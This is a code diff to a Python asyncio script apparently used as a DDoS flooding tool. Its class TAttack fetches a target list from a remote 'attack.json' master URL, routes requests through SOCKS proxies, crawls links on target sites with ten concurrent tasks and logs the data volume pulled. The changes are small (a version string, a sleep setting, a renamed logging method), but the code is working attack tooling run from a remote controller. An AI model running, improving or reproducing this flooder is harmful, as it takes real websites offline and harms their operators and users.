@@ -19,6 +19,8 @@ from aiohttp_socks import ProxyConnector
 from bs4 import BeautifulSoup
 
 
+__version__ = 'VladVons@gmail.com, v1.01, 2022.03.06'
+
 MaxTasks = 10
 MasterUrl = 'http://vpn2.oster.com.ua/www/temp/attack.json'
 
@@ -32,6 +34,7 @@ class TAttack():
         self.TotalData = 0
         self.UrlDone = 0
 
+        self.Sleep = 1
         self.LogFile = 'L_' + urlparse(self.UrlRoot).hostname + '.log'
 
         self.Queue = asyncio.Queue()
@@ -40,7 +43,7 @@ class TAttack():
         self.Event = asyncio.Event()
         self.Wait(False)
 
-    def Log(self, aData: str):
+    def _Log(self, aData: str):
         Time = datetime.now().strftime("%H:%M:%S")
         Data = Time + ' ' + aData
         print(Data)
@@ -91,7 +94,7 @@ class TAttack():
 
         while (True):
             await self.Event.wait()
-            await asyncio.sleep(1)
+            await asyncio.sleep(self.Sleep)
 
             if (self.Queue.empty()):
                 break
@@ -104,7 +107,7 @@ class TAttack():
                         Data = await Response.read()
                         await self._GrabHref(Url, Data, Response.status, aTaskId, time.time() - TimeStart)
             except (aiohttp.ClientConnectorError, aiohttp.ClientError) as E:
-                    self.Log('Err:%s, %s', (E, Url))
+                    self._Log('Err:%s, %s', (E, Url))
             except Exception as E:
                 print('Err', E, Url)
 
@@ -122,8 +125,9 @@ class TAttack():
 class TAttackLog(TAttack):
     async def _DoGrab(self, aUrl: str, aStatus: int, aTaskId: int, aDuration: float):
         Msg = 'task:%d, status:%d, found:%d, done:%d, total:%dM, duration:%.3f, %s;' % (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData / 1000000, aDuration, aUrl)
-        self.Log(Msg)
+        self._Log(Msg)
  
+  
 class TLoader():
     def __init__(self):
         self.Data = {}
@@ -187,4 +191,5 @@ class TMain():
             await asyncio.sleep(60)
 
 
+print(__version__)
 asyncio.run(TMain().Run())
